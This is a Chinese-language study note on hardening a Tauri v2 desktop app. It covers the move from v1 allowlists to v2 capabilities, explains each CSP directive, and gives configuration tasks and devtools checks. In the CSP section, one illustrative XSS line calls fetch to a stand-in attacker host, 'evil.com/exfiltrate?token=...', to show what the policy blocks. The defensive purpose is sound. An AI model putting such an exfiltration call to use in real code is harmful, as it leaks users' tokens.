# B6 — Capabilities + CSP(概念课)

> 创建日期: 2026-06-08
> 配套: [phase B 学习总入口](../2026-06-07-phase-b-learning.md) / [phase B 架构定义](../2026-06-06-phase-b-rust-foundation.md)
> 用途: B6 的概念讲解 + 任务清单 + 自检步骤。学完后回主入口打钩。

---

机械步,但藏着两个值得记的知识点:

1. **Tauri v1 `allowlist` → v2 `capability` 系统的演进**
2. **CSP 各 directive 含义,特别是 `connect-src ipc: https://ipc.localhost`**

---

## 1. v1 `allowlist` → v2 `capability` 系统的演进

### v1 时代:`allowlist`(粗粒度)

Tauri 1.x 在 `tauri.conf.json` 里这样写:

```json
{
  "tauri": {
    "allowlist": {
      "fs": { "readFile": true, "writeFile": true, "scope": ["$APPDATA/*"] },
      "dialog": { "open": true },
      "shell": { "open": true }
    }
  }
}
```

**问题**:

- **全局开关**:一旦开了 `fs.readFile`,**所有窗口、所有 URL** 都能用。没法说"只让 main 窗口能读 fs,about 窗口不能"
- **配置膨胀**:一个大对象塞所有权限,没法拆分到不同环境
- **scope 跟 permission 混在一起**:路径白名单和功能开关挤在同一个字段,理不清
- **没有第三方插件标准**:第三方插件想要权限自己另搞一套

### v2 时代:`capability`(细粒度 + 组合)

v2 把权限拆成三层:

```
plugin 内部定义 "permission"  ────┐
                                  │
.json 文件组合 "capability"  ────┤── 装到 Tauri 启动配置
                                  │
capability 绑定 "window" 范围 ───┘
```

#### 第一层:permission(由插件作者定义)

每个 plugin 自带一堆细粒度许可,比如 `dialog` 插件提供:

- `dialog:allow-open` — 允许打开 file/folder dialog
- `dialog:allow-save` — 允许另存为 dialog
- `dialog:allow-ask` — 允许确认/警告对话框
- `dialog:default` — 一组安全默认

#### 第二层:capability(你写的 json 文件)

`src-tauri/capabilities/default.json` 长这样:

```json
{
  "identifier": "default",
  "windows": ["main"],
  "permissions": [
    "core:default",
    "opener:default",
    "dialog:allow-open"
  ]
}
```

意思:**给 label 为 `main` 的窗口**,授予列表里的权限。

#### 第三层:多个 capability 可以并存

```
capabilities/
├── default.json       (main 窗口的常规权限)
├── debug.json         (只在 dev build 时加的,#[cfg]-style)
├── admin-tools.json   (label="admin" 窗口的额外权限)
```

启动时 Tauri 把所有 .json 合并、按 window label 分发权限。

### 解决了 v1 的什么

- **per-window 权限**:`admin` 窗口能 shell exec,`main` 窗口不能
- **可拆分**:dev/prod、按 feature 分文件,git 友好
- **scope 独立**:路径限制不再混在 permission 里,有专门字段
- **插件作者自治**:第三方 plugin 用同一套 permission 命名(`<plugin>:<perm>`),用户用法一致

### 对我们的具体影响

B6 要做的:`capabilities/default.json` 里加 `dialog:allow-open`(原本只有 `core:default` + `opener:default`),让 Phase D 的 `select_workspace` 能弹出 dialog。

**为什么 `sql` 不需要在这里加?** 因为我们 SQL **全在 Rust 侧用 sqlx 调**,前端不通过插件 IPC 调 `plugin:sql|*` 命令,所以不需要前端 capability。`tauri_plugin_sql::Builder::default().build()` 在 lib.rs 注册过即可。

---

## 2. CSP 各 directive 含义,特别是 `connect-src ipc: https://ipc.localhost`

### CSP 是什么

Content Security Policy,**浏览器(webview)级别的白名单防护**。告诉 webview:"只允许从这些源加载脚本/样式/字体/图片/网络请求"。任何不在白名单的尝试,webview 直接拒绝。

防止的攻击:

- XSS 注入了脚本想 `fetch('https://evil.com/exfiltrate?token=...')` → CSP 拦
- 注入了 `<img src=evil>` 想发心跳 → CSP 拦
- 注入了 `<script src=evil>` 想加载外部 JS → CSP 拦

### 关键 directive

| directive | 控制什么 | 我们设的值 | 为什么 |
|-----------|---------|----------|--------|
| `default-src` | 兜底,其他 directive 没指定就用这个 | `'self' tauri: https://tauri.localhost` | 只允许本应用自己的源 |
| `script-src` | 加载/执行哪些 JS | `'self'` | 严格,只加载打包好的 JS |
| `style-src` | 加载哪些 CSS | `'self' 'unsafe-inline'` | Tailwind / shadcn 动态 inline style 必需 |
| `img-src` | 加载哪些 image | `'self' data: https:` | 允许 data URL 和任意 HTTPS 图(头像、外链图等) |
| `font-src` | 加载哪些字体 | `'self' data:` | Geist 字体本地 + base64 内嵌 |
| `connect-src` | **fetch/XHR/WebSocket/EventSource 允许去哪** | `'self' ipc: https://ipc.localhost` | **本节重点** |

### `connect-src 'self' ipc: https://ipc.localhost` 拆解

这是 Tauri 2 IPC 工作的**必需**白名单。三部分:

#### `'self'`

允许同源请求 —— 即 `tauri://localhost`(主页面所在的伪协议域),用于加载自己的资源。

#### `ipc:`

**Tauri 2 的特殊协议 scheme**,专给 IPC 用。

当你前端调 `invoke('get_workspace')`,Tauri 内部其实是发了一个 `ipc://...` 的请求(在 Tauri 内部被特殊拦截、转 IPC 走 native 通道,不真去网络)。但 webview 看到 fetch 调用时,它**不知道这是 Tauri 做的特殊处理**,只看到"哦,在发 ipc:// 请求"。CSP 必须明确允许这个 scheme,否则 webview 在 fetch 出发前就给拒了。

#### `https://ipc.localhost`

某些平台/某些 Tauri 版本下,IPC 用的不是 `ipc://` scheme,而是 `https://ipc.localhost/...`(伪 HTTPS,内部还是拦截)。所以两个都列上,跨平台兼容。

**记忆**:这俩**永远成对出现**,你只要看到 `connect-src` 就知道一定要有 `ipc: https://ipc.localhost`,这是 Tauri IPC 的"通行证"。

### 我们为什么**不需要** `https://api.anthropic.com`

这就是全原生架构的核心收益:

**前端永远不直接 fetch 任何外部 API**。所有 LLM 调用走 Rust 的 `reqwest`(`reqwest` 在 Rust 进程里,不经过 webview,不受 CSP 约束)。

所以 `connect-src` 里**只有 `'self'` + IPC**,任何外网都没列。攻击面消除了一整类问题:

- XSS 想直接调用 Anthropic API exfiltrate 数据 → CSP 拦(`api.anthropic.com` 不在白名单)
- 想偷偷 fetch 第三方分析服务 → 拦
- 想 WebSocket 连命令控制服务器 → 拦

如果未来要加新 provider(比如本地 Ollama `http://localhost:11434`),**还是不用动 CSP**,因为调用全在 Rust 侧。这是早期架构决策(patch-01 之前那次"全原生 vs 前端直调"的讨论)留下的"自动给未来减负"。

### 反例:如果是前端直调架构

若选了 v0 plan 那种"前端用 Vercel AI SDK 直调 Anthropic",CSP 必须写:

```
connect-src 'self' ipc: https://ipc.localhost
            https://api.anthropic.com
            https://api.openai.com
            https://generativelanguage.googleapis.com
            ...   ← 每加一个 provider 加一行
```

而且 token 必须在 JS heap 里短暂存在,XSS 还是能拿。**这就是为什么"全原生 + 锁死 CSP"是更好架构**,B6 是它的兑现时刻。

---

## 3. 任务

### 任务 1:`src-tauri/capabilities/default.json`

加 `dialog:allow-open`:

```json
{
  "$schema": "../gen/schemas/desktop-schema.json",
  "identifier": "default",
  "description": "Capability for the main window",
  "windows": ["main"],
  "permissions": [
    "core:default",
    "opener:default",
    "dialog:allow-open"
  ]
}
```

(`$schema` / `description` 如有保留,无则可省。)

### 任务 2:`src-tauri/tauri.conf.json`

`security.csp` 从 `null` 改成:

```json
"security": {
  "csp": "default-src 'self' tauri: https://tauri.localhost; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' ipc: https://ipc.localhost"
}
```

JSON 不支持多行字符串,**必须写成一行**(可读性差但没办法,要拆得用 `\n`,但浏览器不解析换行,意义不大)。

---

## 4. 验证

```bash
# 重启 dev(改 tauri.conf.json 必须重启 cargo,前端 HMR 不够)
pnpm tauri dev
```

打开 devtools,Console 跑这三条:

### 4.1 IPC 仍然工作

```js
await __TAURI__.core.invoke('get_workspace')
// 预期: { code: "other", message: "todo" }
```

如果通了 = `ipc: https://ipc.localhost` 写对了。

### 4.2 外网 fetch 被拦(CSP 生效证明)

```js
fetch('https://www.google.com')
// 预期: console 红字 "Refused to connect to 'https://www.google.com/' because
//       it violates the following Content Security Policy directive: connect-src ..."
```

被拦 = CSP 在生效。

### 4.3 Network 面板看 CSP header

devtools Network tab → 刷新窗口 → 点 `index.html` → Response Headers 应该有:

```
content-security-policy: default-src 'self' tauri: ...
```

存在 = CSP 已下发给 webview。

---

## 5. 卡点 / 易错点提醒

- **改 `tauri.conf.json` 必须重启 cargo**(`pnpm tauri dev` 整套重启),前端 HMR 不够 —— 这个 config 是 Rust 编译期注入的
- **JSON 字符串里的单引号 `'self'`** 是 CSP 语法的一部分,**保留**,别误删
- **没有 `unsafe-inline` 在 `style-src` 里 Tailwind 会出问题** —— 因为 shadcn / tw-animate-css 会动态注入 `<style>` 标签
- **CSP 一处 typo 整个失效** —— 浏览器默默关掉防护,所以**必须**通过"fetch google 被拦"来验证,不能只看代码
- **dialog 不弹** —— 检查 capability 是否加了 `dialog:allow-open`,以及 lib.rs 是否注册了 `tauri_plugin_dialog::init()`(B5 已加)
